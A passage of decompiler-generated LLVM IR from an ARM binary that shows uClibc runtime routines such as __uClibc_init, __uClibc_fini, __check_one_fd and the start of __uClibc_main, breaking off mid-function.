  %v1_1499051 = phi i32 [ %v1_14990, %bb.dec_label_pc_1499c_crit_edge ], [ %v1_1499046, %entry ]
  %v0_149a450 = phi i32 [ %v1_149d0, %bb.dec_label_pc_1499c_crit_edge ], [ %v3_14984, %entry ]
  store i32 %v1_1499051, i32* @r1, align 4
  %v1_149a0 = add i32 %v0_149a0, 132
  store i32 %v1_149a0, i32* @r2, align 4
  store i32 %v0_149a450, i32* %r4.global-to-local, align 4
  %v1_149a834 = inttoptr i32 %v1_149a0 to i32*
  %v2_149a835 = load i32, i32* %v1_149a834, align 4
  store i32 %v2_149a835, i32* @r3, align 4
  %v3_149ac37 = icmp uge i32 %v2_149a835, %v0_149a450
  store i1 %v3_149ac37, i1* %cpsr_c.global-to-local, align 1
  %v9_149ac43 = icmp eq i32 %v2_149a835, %v0_149a450
  br i1 %v9_149ac43, label %dec_label_pc_149b4, label %dec_label_pc_149cc

dec_label_pc_149b4:                               ; preds = %dec_label_pc_1499c, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_149c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_149c4, label %dec_label_pc_149c8, label %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge

dec_label_pc_149b4.dec_label_pc_149a8_crit_edge:  ; preds = %dec_label_pc_149b4
  %v0_149a8.pre = load i32, i32* @r2, align 4
  %v1_149ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_149a8 = inttoptr i32 %v0_149a8.pre to i32*
  %v2_149a8 = load i32, i32* %v1_149a8, align 4
  store i32 %v2_149a8, i32* @r3, align 4
  %v3_149ac = icmp uge i32 %v2_149a8, %v1_149ac.pre
  store i1 %v3_149ac, i1* %cpsr_c.global-to-local, align 1
  %v9_149ac = icmp eq i32 %v2_149a8, %v1_149ac.pre
  br i1 %v9_149ac, label %dec_label_pc_149b4, label %dec_label_pc_149cc

dec_label_pc_149c8:                               ; preds = %dec_label_pc_149b4
  %v0_149c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_149c8, i32* @r3, align 4
  br label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %dec_label_pc_1499c, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge, %dec_label_pc_149c8
  %v1_149d0 = phi i32 [ %v0_149c8, %dec_label_pc_149c8 ], [ %v2_149a835, %dec_label_pc_1499c ], [ %v2_149a8, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge ]
  %v1_149cc = load i32, i32* %r6.global-to-local, align 4
  %v3_149cc = icmp uge i32 %v1_149d0, %v1_149cc
  store i1 %v3_149cc, i1* %cpsr_c.global-to-local, align 1
  %v9_149cc = icmp eq i32 %v1_149d0, %v1_149cc
  br i1 %v9_149cc, label %dec_label_pc_149d8, label %bb

bb:                                               ; preds = %dec_label_pc_149cc
  store i32 %v1_149d0, i32* %r6.global-to-local, align 4
  %v1_14990 = or i32 %v1_149d0, 2
  store i32 %v1_14990, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14994 = icmp eq i32 %v1_14990, %v1_149d0
  br i1 %v9_14994, label %dec_label_pc_14a40, label %bb.dec_label_pc_1499c_crit_edge

bb.dec_label_pc_1499c_crit_edge:                  ; preds = %bb
  %v0_149a0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1499c

dec_label_pc_149d8:                               ; preds = %dec_label_pc_149cc
  %v0_149d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_149d8 = and i32 %v0_149d8, -69
  store i32 %v1_149d8, i32* @r3, align 4
  %v2_149dc = icmp ugt i32 %v1_149d8, 9
  store i1 %v2_149dc, i1* %cpsr_c.global-to-local, align 1
  %v7_149dc = icmp eq i32 %v1_149d8, 10
  br i1 %v7_149dc, label %dec_label_pc_149e4, label %dec_label_pc_14a40

dec_label_pc_149e4:                               ; preds = %dec_label_pc_149d8
  %v1_149e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_149e8 = add i32 %v1_149e8, 544
  %v3_149e8 = inttoptr i32 %v2_149e8 to i32*
  store i32 -1, i32* %v3_149e8, align 4
  %v0_149ec = load i32, i32* @r2, align 4
  store i32 %v0_149ec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_149f0

dec_label_pc_149f0:                               ; preds = %dec_label_pc_14a24.dec_label_pc_149f0_crit_edge, %dec_label_pc_149e4
  %v0_149f4 = phi i32 [ %v0_149f4.pre, %dec_label_pc_14a24.dec_label_pc_149f0_crit_edge ], [ %v0_149ec, %dec_label_pc_149e4 ]
  %v0_149f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_149f0 = add i32 %v0_149f0, 132
  %v2_149f0 = inttoptr i32 %v1_149f0 to i32*
  %v3_149f0 = load i32, i32* %v2_149f0, align 4
  store i32 %v0_149f4, i32* @r2, align 4
  store i32 %v3_149f0, i32* %r4.global-to-local, align 4
  %v1_149fc = or i32 %v3_149f0, 16
  store i32 %v1_149fc, i32* @r1, align 4
  %v1_14a0022 = inttoptr i32 %v0_149f4 to i32*
  %v2_14a0023 = load i32, i32* %v1_14a0022, align 4
  %v3_14a0425 = icmp uge i32 %v2_14a0023, %v3_149f0
  store i1 %v3_14a0425, i1* %cpsr_c.global-to-local, align 1
  %v9_14a0431 = icmp eq i32 %v2_14a0023, %v3_149f0
  br i1 %v9_14a0431, label %dec_label_pc_14a0c, label %dec_label_pc_14a24

dec_label_pc_14a0c:                               ; preds = %dec_label_pc_149f0, %dec_label_pc_14a0c.dec_label_pc_14a00_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14a1c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14a1c, label %dec_label_pc_14a20, label %dec_label_pc_14a0c.dec_label_pc_14a00_crit_edge

dec_label_pc_14a0c.dec_label_pc_14a00_crit_edge:  ; preds = %dec_label_pc_14a0c
  %v0_14a00.pre = load i32, i32* @r2, align 4
  %v1_14a04.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14a00 = inttoptr i32 %v0_14a00.pre to i32*
  %v2_14a00 = load i32, i32* %v1_14a00, align 4
  %v3_14a04 = icmp uge i32 %v2_14a00, %v1_14a04.pre
  store i1 %v3_14a04, i1* %cpsr_c.global-to-local, align 1
  %v9_14a04 = icmp eq i32 %v2_14a00, %v1_14a04.pre
  br i1 %v9_14a04, label %dec_label_pc_14a0c, label %dec_label_pc_14a24

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14a0c
  %v0_14a20 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a24

dec_label_pc_14a24:                               ; preds = %dec_label_pc_149f0, %dec_label_pc_14a0c.dec_label_pc_14a00_crit_edge, %dec_label_pc_14a20
  %v0_14a24 = phi i32 [ %v0_14a20, %dec_label_pc_14a20 ], [ %v2_14a0023, %dec_label_pc_149f0 ], [ %v2_14a00, %dec_label_pc_14a0c.dec_label_pc_14a00_crit_edge ]
  %v1_14a24 = phi i32 [ %v0_14a20, %dec_label_pc_14a20 ], [ %v3_149f0, %dec_label_pc_149f0 ], [ %v1_14a04.pre, %dec_label_pc_14a0c.dec_label_pc_14a00_crit_edge ]
  %v3_14a24 = icmp uge i32 %v0_14a24, %v1_14a24
  store i1 %v3_14a24, i1* %cpsr_c.global-to-local, align 1
  %v9_14a24 = icmp eq i32 %v0_14a24, %v1_14a24
  br i1 %v9_14a24, label %dec_label_pc_14a2c, label %dec_label_pc_14a24.dec_label_pc_149f0_crit_edge

dec_label_pc_14a24.dec_label_pc_149f0_crit_edge:  ; preds = %dec_label_pc_14a24
  %v0_149f4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_149f0

dec_label_pc_14a2c:                               ; preds = %dec_label_pc_14a24
  store i32 116, i32* @r3, align 4
  %v0_14a34 = load i32, i32* %r8.global-to-local, align 4
  %v2_14a34 = add i32 %v0_14a34, 116
  %v3_14a34 = inttoptr i32 %v2_14a34 to i32*
  %v4_14a34 = load i32, i32* %v3_14a34, align 4
  store i32 %v4_14a34, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14a34)
  %v0_14a40.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14a40

dec_label_pc_14a40:                               ; preds = %entry, %bb, %dec_label_pc_149d8, %dec_label_pc_14a2c
  %v0_14a40 = phi i32 [ %v1_149d0, %dec_label_pc_149d8 ], [ %v0_14a40.pre, %dec_label_pc_14a2c ], [ %v3_14984, %entry ], [ %v1_149d0, %bb ]
  %v2_14a44 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14a44, i32* @r4, align 4
  ret i32 %v0_14a40

; uselistorder directives
  uselistorder i32 %v0_14a20, { 1, 0 }
  uselistorder i32 %v1_14a04.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14990, { 1, 2, 0 }
  uselistorder i32 %v1_149cc, { 1, 0 }
  uselistorder i32 %v1_149d0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_149ac.pre, { 1, 0 }
  uselistorder i32 %v0_149a450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14a40, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14a24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a0c, { 1, 0 }
  uselistorder label %dec_label_pc_149cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149b4, { 1, 0 }
  uselistorder label %dec_label_pc_1499c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14a64 = add i32 %tmp, 4
  %v4_14a64 = inttoptr i32 %v3_14a64 to i32*
  store i32 %arg3, i32* %v4_14a64, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_14a70 = icmp eq i32 %arg2, 0
  br i1 %v2_14a70, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_14a7c = add i32 %tmp, 4
  %v3_14a7c = inttoptr i32 %v2_14a7c to i32*
  %v4_14a7c = load i32, i32* %v3_14a7c, align 4
  store i32 %v4_14a7c, i32* %r0.global-to-local, align 4
  %v3_14a80 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_14a80, %bb ], [ undef, %entry ]
  %v2_14a88 = xor i1 %v2_14a70, true
  call void @__pseudo_cond_branch(i1 %v2_14a88, i32 %.02)
  %v1_14a94 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14a94

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_14abc.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14a98 = load i32, i32* @r4, align 4
  store i32 %v3_14a98, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14abc

dec_label_pc_14abc:                               ; preds = %dec_label_pc_14abc.dec_label_pc_14abc_crit_edge, %dec_label_pc_14abc.lr.ph
  %v1_14abc = phi i32 [ %v1_14ac8, %dec_label_pc_14abc.dec_label_pc_14abc_crit_edge ], [ 0, %dec_label_pc_14abc.lr.ph ]
  %v0_14abc = phi i32 [ %v0_14abc.pre, %dec_label_pc_14abc.dec_label_pc_14abc_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -8), %dec_label_pc_14abc.lr.ph ]
  %v4_14abc = mul i32 %v1_14abc, 4
  %v5_14abc = add i32 %v4_14abc, %v0_14abc
  %v6_14abc = inttoptr i32 %v5_14abc to i32*
  %v7_14abc = load i32, i32* %v6_14abc, align 4
  call void @__pseudo_branch(i32 %v7_14abc)
  %v0_14ac8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ac8 = add i32 %v0_14ac8, -1
  store i32 %v1_14ac8, i32* %r4.global-to-local, align 4
  %v2_14ac8 = icmp eq i32 %v0_14ac8, 0
  br i1 %v2_14ac8, label %dec_label_pc_14ad0, label %dec_label_pc_14abc.dec_label_pc_14abc_crit_edge

dec_label_pc_14abc.dec_label_pc_14abc_crit_edge:  ; preds = %dec_label_pc_14abc
  %v0_14abc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14abc

dec_label_pc_14ad0:                               ; preds = %dec_label_pc_14abc
  %v0_14ad4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14ad4 = add i32 %v0_14ad4.pre, 2004
  %v3_14ad4 = inttoptr i32 %v2_14ad4 to i32*
  %v4_14ad4 = load i32, i32* %v3_14ad4, align 4
  %v2_14ad8 = icmp eq i32 %v4_14ad4, 0
  br i1 %v2_14ad8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14ad0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14ad0, %bb
  %v2_14ae0 = xor i1 %v2_14ad8, true
  call void @__pseudo_cond_branch(i1 %v2_14ae0, i32 %v4_14ad4)
  %v0_14ae8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ae8 = add i32 %v0_14ae8, 2008
  %v3_14ae8 = inttoptr i32 %v2_14ae8 to i32*
  %v4_14ae8 = load i32, i32* %v3_14ae8, align 4
  %v2_14aec = icmp eq i32 %v4_14ae8, 0
  br i1 %v2_14aec, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14af4 = xor i1 %v2_14aec, true
  call void @__pseudo_cond_branch(i1 %v2_14af4, i32 %v4_14ae8)
  %v2_14af8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14af8, i32* %r4.global-to-local, align 4
  %v1_14afc = load i32, i32* @r0, align 4
  ret i32 %v1_14afc

; uselistorder directives
  uselistorder i32 %v1_14ac8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14b14 = load i32, i32* @r4, align 4
  %v6_14b14 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14b28 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14b30 = icmp eq i32 %v2_14b28, -1
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r3, align 4
  br i1 %v3_14b30, label %dec_label_pc_14b3c, label %dec_label_pc_14b54

dec_label_pc_14b3c:                               ; preds = %entry
  %v0_14b40 = load i32, i32* @r5, align 4
  %v2_14b48 = inttoptr i32 %v0_14b40 to i32*
  %v3_14b48 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 -34364), i32* %v2_14b48)
  %v1_14b4c = load i32, i32* @r4, align 4
  %v1_14b50 = icmp ne i32 %v3_14b48, %v1_14b4c
  call void @__pseudo_cond_branch(i1 %v1_14b50, i32 ptrtoint (i32* @global_var_13470.537 to i32))
  br label %dec_label_pc_14b54

dec_label_pc_14b54:                               ; preds = %entry, %dec_label_pc_14b3c
  %v1_14b5c = phi i32 [ %v2_14b28, %entry ], [ %v3_14b48, %dec_label_pc_14b3c ]
  store i32 %v3_14b14, i32* @r4, align 4
  store i32 %v6_14b14, i32* @r5, align 4
  ret i32 %v1_14b5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14b54, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b68 = load i32, i32* @r4, align 4
  store i32 %v3_14b68, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r4.global-to-local, align 4
  %v4_14b78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 148) to i32*), align 4
  %v1_14b7c = inttoptr i32 %v4_14b78 to i32*
  %v2_14b7c = load i32, i32* %v1_14b7c, align 4
  %v2_14b80 = icmp eq i32 %v2_14b7c, 0
  br i1 %v2_14b80, label %dec_label_pc_14b88, label %dec_label_pc_14bac

dec_label_pc_14b88:                               ; preds = %entry
  store i32 4096, i32* %v1_14b7c, align 4
  %v0_14b90 = call i32 @__pthread_initialize_minimal()
  %v0_14b98 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b98 = add i32 %v0_14b98, -48348
  %v2_14ba0 = icmp eq i32 %v2_14b98, 0
  br i1 %v2_14ba0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14b88
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14b88, %bb
  %v2_14ba8 = xor i1 %v2_14ba0, true
  call void @__pseudo_cond_branch(i1 %v2_14ba8, i32 %v2_14b98)
  %v2_14bac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14bac

dec_label_pc_14bac:                               ; preds = %entry, %bb4
  %v2_14bac = phi i32 [ %v2_14bac.pre, %bb4 ], [ %v3_14b68, %entry ]
  %.0 = phi i32 [ %v0_14b90, %bb4 ], [ undef, %entry ]
  store i32 %v2_14bac, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bac, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 54320, i32* %r4.global-to-local, align 4
  %v1_14bcc = add i32 %tmp, 4
  store i32 %v1_14bcc, i32* %ip.global-to-local, align 4
  %v2_14bd0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r4.global-to-local, align 4
  %v3_14bdc = mul i32 %arg2, 4
  store i32 %v3_14bdc, i32* @r7, align 4
  %v4_14be4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 24) to i32*), align 4
  store i32 %v4_14be4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_14bec = add i32 %v1_14bcc, %v3_14bdc
  store i32 %v2_14bec, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %stack_var_-416, align 4
  %v4_14bf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 56) to i32*), align 4
  store i32 %v4_14bf4, i32* %r4.global-to-local, align 4
  %v3_14bf8 = icmp uge i32 %v2_14bec, %v2_14bd0
  store i1 %v3_14bf8, i1* %cpsr_c.global-to-local, align 1
  %v9_14bf8 = icmp eq i32 %v2_14bec, %v2_14bd0
  store i1 %v9_14bf8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14c00 = inttoptr i32 %v4_14bf4 to i32*
  store i32 %v2_14bec, i32* %v2_14c00, align 4
  br i1 %v9_14bf8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14c08 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c08 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c08 = inttoptr i32 %v1_14c08 to i32*
  store i32 %v0_14c08, i32* %v2_14c08, align 4
  %v2_14c0c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14c0c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14c18 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14c18, i32* @r6, align 4
  br i1 %v9_14bf8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_14c2053 = add i32 %v2_14c0c, 2008
  %v4_14c2054 = inttoptr i32 %v3_14c2053 to i32*
  store i32 %arg6, i32* %v4_14c2054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_14c1c = load i32, i32* %ip.global-to-local, align 4
  %v2_14c1c = load i32, i32* @r7, align 4
  %v3_14c1c = add i32 %v2_14c1c, %v1_14c1c
  store i32 %v3_14c1c, i32* %r3.global-to-local, align 4
  %v3_14c2050 = add i32 %v2_14c0c, 2008
  %v4_14c2051 = inttoptr i32 %v3_14c2050 to i32*
  store i32 %arg6, i32* %v4_14c2051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_14c2c = load i32, i32* %r3.global-to-local, align 4
  %v2_14c2c = load i32, i32* %r4.global-to-local, align 4
  %v3_14c2c = inttoptr i32 %v2_14c2c to i32*
  store i32 %v1_14c2c, i32* %v3_14c2c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_14c30 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_14c30, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_14c38 = bitcast i32* %stack_var_-120 to i8*
  %v4_14c38 = call i32 @__GI_memset(i8* %v3_14c38, i32 0, i32 120)
  store i32 %v4_14c38, i32* %r0.global-to-local, align 4
  %v0_14c3c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c3c = inttoptr i32 %v0_14c3c to i32*
  %v2_14c3c = load i32, i32* %v1_14c3c, align 4
  br label %dec_label_pc_14c48

dec_label_pc_14c48:                               ; preds = %dec_label_pc_14c48, %bb77
  %storemerge = phi i32 [ %v2_14c3c, %bb77 ], [ %v1_14c54, %dec_label_pc_14c48 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14c48 = inttoptr i32 %storemerge to i32*
  %v2_14c48 = load i32, i32* %v1_14c48, align 4
  store i32 %v2_14c48, i32* %r3.global-to-local, align 4
  %v2_14c4c = icmp eq i32 %v2_14c48, 0
  %v1_14c54 = add i32 %storemerge, 4
  br i1 %v2_14c4c, label %dec_label_pc_14c54, label %dec_label_pc_14c48

dec_label_pc_14c54:                               ; preds = %dec_label_pc_14c48
  store i32 %v1_14c54, i32* @r4, align 4
  store i32 %v2_14c30, i32* @r5, align 4
  %v1_14c7830 = inttoptr i32 %v1_14c54 to i32*
  %v2_14c7831 = load i32, i32* %v1_14c7830, align 4
  store i32 %v2_14c7831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c7c33 = icmp eq i32 %v2_14c7831, 0
  store i1 %v2_14c7c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c7c33, label %dec_label_pc_14c84, label %dec_label_pc_14c60

dec_label_pc_14c60:                               ; preds = %dec_label_pc_14c54, %dec_label_pc_14c78
  %v4_14c68 = phi i32 [ %v1_14c74, %dec_label_pc_14c78 ], [ %v1_14c54, %dec_label_pc_14c54 ]
  %v5_14c64 = phi i32 [ %v2_14c78, %dec_label_pc_14c78 ], [ %v2_14c7831, %dec_label_pc_14c54 ]
  %v2_14c60 = icmp ugt i32 %v5_14c64, 13
  store i1 %v2_14c60, i1* %cpsr_c.global-to-local, align 1
  %v7_14c60 = icmp eq i32 %v5_14c64, 14
  store i1 %v7_14c60, i1* %cpsr_z.global-to-local, align 1
  %v2_14c64 = xor i1 %v2_14c60, true
  %v3_14c64 = or i1 %v7_14c60, %v2_14c64
  br i1 %v3_14c64, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_14c60
  %v4_14c64 = load i32, i32* @r5, align 4
  %v6_14c64 = and i32 %v5_14c64, 536870912
  %v7_14c64 = icmp ne i32 %v6_14c64, 0
  store i1 %v7_14c64, i1* %cpsr_c.global-to-local, align 1
  %v8_14c64 = mul i32 %v5_14c64, 8
  %v9_14c64 = add i32 %v4_14c64, %v8_14c64
  store i32 %v9_14c64, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_14c60, %bb78
  %v1_14c70 = phi i1 [ %v2_14c60, %dec_label_pc_14c60 ], [ %v7_14c64, %bb78 ]
  %v2_14c68 = xor i1 %v1_14c70, true
  %v3_14c68 = or i1 %v7_14c60, %v2_14c68
  br i1 %v3_14c68, label %bb80, label %dec_label_pc_14c78

bb80:                                             ; preds = %bb79
  store i32 %v4_14c68, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14c78

dec_label_pc_14c78:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_14c68, i32 ptrtoint (i32* @global_var_118e0.546 to i32))
  %v0_14c74 = load i32, i32* @r4, align 4
  %v1_14c74 = add i32 %v0_14c74, 8
  store i32 %v1_14c74, i32* @r4, align 4
  %v1_14c78 = inttoptr i32 %v1_14c74 to i32*
  %v2_14c78 = load i32, i32* %v1_14c78, align 4
  store i32 %v2_14c78, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c7c = icmp eq i32 %v2_14c78, 0
  store i1 %v2_14c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c7c, label %dec_label_pc_14c84, label %dec_label_pc_14c60

dec_label_pc_14c84:                               ; preds = %dec_label_pc_14c78, %dec_label_pc_14c54
  store i32 %v2_14c30, i32* %r0.global-to-local, align 4
  %v1_14c88 = call i32 @_dl_aux_init(i32 %v2_14c30)
  store i32 %v1_14c88, i32* %r0.global-to-local, align 4
  %v1_14c8c = call i32 @__GI___uClibc_init(i32 %v1_14c88)
  store i32 %v1_14c8c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_14c94 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14c94, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_14c9c = add i32 %v2_14c94, 148
  %v3_14c9c = inttoptr i32 %v2_14c9c to i32*
  %v4_14c9c = load i32, i32* %v3_14c9c, align 4
  store i32 %v4_14c9c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ca4 = icmp eq i32 %tmp66, 0
  store i1 %v2_14ca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ca4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_14c84
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_14c84, %bb81
  %v0_14cb0 = phi i32 [ %tmp66, %dec_label_pc_14c84 ], [ 4096, %bb81 ]
  %v3_14cac = icmp eq i32 %tmp65, -1
  store i1 %v3_14cac, i1* %cpsr_c.global-to-local, align 1
  %v8_14cac = icmp eq i32 %tmp65, -1
  store i1 %v8_14cac, i1* %cpsr_z.global-to-local, align 1
  %v2_14cb0 = inttoptr i32 %v4_14c9c to i32*
  store i32 %v0_14cb0, i32* %v2_14cb0, align 4
